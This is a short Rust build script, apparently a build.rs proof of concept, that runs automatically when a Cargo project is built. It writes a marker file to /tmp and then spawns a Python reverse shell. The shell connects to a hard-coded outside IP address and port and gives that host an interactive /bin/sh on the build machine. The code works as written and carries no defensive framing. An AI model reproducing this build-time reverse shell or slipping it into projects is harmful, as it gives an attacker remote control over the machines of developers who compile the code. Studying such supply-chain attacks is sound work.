use std::fs;
use std::process::Command;

fn main() {
    println!("cargo:warning=Running malicious code at build time!");

    // Create the /tmp/pwned file
    fs::write("/tmp/pwned", "PoC RCE successful at build time!").unwrap();

    // Optional: Run a reverse shell
    let _ = Command::new("sh")
        .arg("-c")
        .arg("python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"103.160.106.201\", 5050)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"/bin/sh\",\"-i\"]);'")
        .spawn();
}
